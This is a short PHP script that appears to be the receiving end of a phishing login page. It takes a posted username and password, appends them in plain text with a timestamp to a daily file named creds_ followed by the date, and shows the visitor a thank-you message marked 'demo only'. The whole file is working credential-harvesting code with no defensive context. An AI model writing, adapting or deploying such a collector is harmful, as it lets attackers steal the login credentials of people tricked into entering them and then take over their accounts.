<?php

$user = isset($_POST['user']) ? $_POST['user'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$time = date('Y-m-d H:i:s');

$filename = "creds_" . date('Ymd') . ".txt";

$file = fopen($filename, "a");
fwrite($file, "[$time] User: $user | Pass: $pass\n");
fclose($file);

echo "✅ Thanks! (demo only)";
?>
